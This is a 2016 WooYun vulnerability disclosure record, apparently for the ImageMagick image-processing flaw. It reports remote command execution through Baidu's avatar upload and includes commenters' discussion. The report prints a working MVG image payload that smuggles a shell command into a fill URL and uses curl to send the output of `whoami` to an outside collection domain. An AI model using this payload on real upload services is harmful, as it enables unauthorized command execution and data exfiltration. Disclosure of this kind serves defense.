{"id": 87955, "wybug_id": "wooyun-2016-0205206", "wybug_title": "一张图片引发的血案百度某处命令执行                                      ", "wybug_corp": "百度", "wybug_author": "CplusHua", "wybug_date": "2016-05-05 10:41", "wybug_open_date": "2016-06-20 18:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向公众公开  简要描述： 提交到百度SRC结果最后要绑定手机,绑定成功后写得东西都没了,而且百度SRC不支持https访问...... 用户体验太差了.只好提交到这来... 详细说明：  Imagic 执行了命令..   漏洞证明：  \n\n更改头像的地方http://www.baidu.com/p/setting/profile/portrait\n\n上传个图片,这里用HawkEye进行数据收集(跟cloudeye是一样的好东西).图片代码如下:push graphic-contextviewbox 0 0 640 480fill 'url(https://\"|curl `whoami`.baidu.a.0.l00.win\")'pop graphic-context获取数据如下:\n\n\n\n如果感觉问题不严重可联系我,深入一下.你懂得.   修复方案：  理论上没有升级的子站点所有能上传图片进行二次渲染的地方调用了这个库就可以执行了.官方已经出最新版本,可直接升级.   版权声明：转载请注明来源 CplusHua@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2016-05-06 17:59 厂商回复： 感谢您关注百度安全！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-05 10:42 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:780 漏洞数:158        | going)\t\t \n  imagemagick?    \n     2016-05-05 11:09 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1914 漏洞数:304        | 最近有人冒充该账号行骗，任何自称HackBrai...)\t\t \n  牛逼啊    \n     2016-05-05 11:12 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:395 漏洞数:73        | 我是一只毛毛虫。)\t\t \n  估计是Imagemagick    \n     2016-05-05 11:15 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:2110 漏洞数:375        | weibo那个j14n不是我。)\t\t \n  中华。。。    \n     2016-05-05 11:25 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:95        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  imagemagick的问题？    \n     2016-05-05 11:26 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:27        | 喝口水,压压惊......)\t\t \n  百度主站，，，    \n     2016-05-05 11:27 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:780 漏洞数:158        | going)\t\t \n  @HackBraid 原来你是大V啊    \n     2016-05-05 11:30 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1672 漏洞数:236        | 。)\t\t \n  牛逼    \n     2016-05-05 12:09 |    \t\t0hey_boy0 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:23        | balabala~)\t\t \n  Imagemagick     \n     2016-05-05 12:18 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1914 漏洞数:304        | 最近有人冒充该账号行骗，任何自称HackBrai...)\t\t \n  @D＆G - -低调低调，好久没聊天了    \n     2016-05-05 12:31 |    \t\tbyr5ec \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | I'm pursuing all teh time 5h37|_!)\t\t \n  使用这个类库Imagemagick处理图片有哪些应用，wordpress /DZ?     \n     2016-05-05 12:33 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:95        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  @byr5ec   http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&mid=2651864831&idx=1&sn=e987537da27c2e5162d1e1b05e9a40c1&scene=2&srcid=05059Jkm9ETQnlTNxvfMCImC&from=timeline&isappinstalled=0#wechat_redirect  看介里    \n     2016-05-05 12:35 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:264 漏洞数:31        | bug is my best friend)\t\t \n  果然imagemagick    \n     2016-05-05 13:34 |    \t\tbyr5ec \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | I'm pursuing all teh time 5h37|_!)\t\t \n  @随风的风,如果修复的话，还不太好批量找出这个Imagemagick?php扩展默认没有。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}